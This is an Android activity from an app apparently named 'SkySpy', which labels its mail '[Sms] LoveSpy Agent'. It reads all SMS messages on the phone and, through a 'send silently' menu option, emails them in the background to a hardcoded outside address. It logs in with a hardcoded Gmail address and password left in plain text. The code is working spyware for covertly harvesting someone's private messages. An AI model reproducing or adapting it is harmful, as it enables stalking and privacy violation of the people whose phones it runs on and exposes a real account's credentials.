package com.example.skyspy.app.ui;

import android.app.Activity;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.TextView;
import android.widget.Toast;

import com.example.skyspy.app.R;
import com.example.skyspy.app.email.EmailSending;
import com.example.skyspy.app.sms.SmsReader;
import com.example.skyspy.app.utils.Utils;

public class SmsActivity extends Activity{

    private EmailSending mEmailSending;
    private String mLetter;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        TextView textView = new TextView(this);
        SmsReader smsReader = new SmsReader(this);
        mLetter = smsReader.getSmsList();
        textView.setText(mLetter);
        setContentView(textView);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.sms_menu, menu);
        return super.onCreateOptionsMenu(menu);
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case R.id.send_message_via_chooser:
                EmailSending.sendViaChooser(this);
                return true;
            case R.id.send_message_silently:
                new AsyncTask<Void,Void,Void>() {
                    @Override
                    protected Void doInBackground(Void... voids) {
                        sendEmailSilently();
                        return null;
                    }
                }.execute();
            default:
        }
        return super.onOptionsItemSelected(item);
    }

    public void sendEmailSilently() {
        mEmailSending = new EmailSending("o.kapustiyan@gmail.com", "samsungforever");
        String[] toArr = {"1eecooper@ukr.net"};
        mEmailSending.setTo(toArr);
        mEmailSending.setFrom("wooo@wooo.com");
        mEmailSending.setSubject("[Sms] LoveSpy Agent");
        mEmailSending.setBody(mLetter);
        try {
            //mEmailSending.addAttachment("/sdcard/filelocation");
            if(mEmailSending.sendSilently()) {
                //Toast.makeText(this, "Email was sent successfully.", Toast.LENGTH_LONG).show();
                runToastOnUiThread("Email was sent successfully.", Toast.LENGTH_LONG);
            } else {
                //Toast.makeText(this, "Email was not sent.", Toast.LENGTH_LONG).show();
                runToastOnUiThread("Email was not sent.", Toast.LENGTH_LONG);
            }
        } catch(Exception e) {
            //Toast.makeText(MailApp.this, "There was a problem sending the email.", Toast.LENGTH_LONG).show();
            Log.e(Utils.TAG, "Could not send email", e);
        }
    }

    public void runToastOnUiThread(final String text, final int length) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(SmsActivity.this, text, length).show();
            }
        });
    }
}
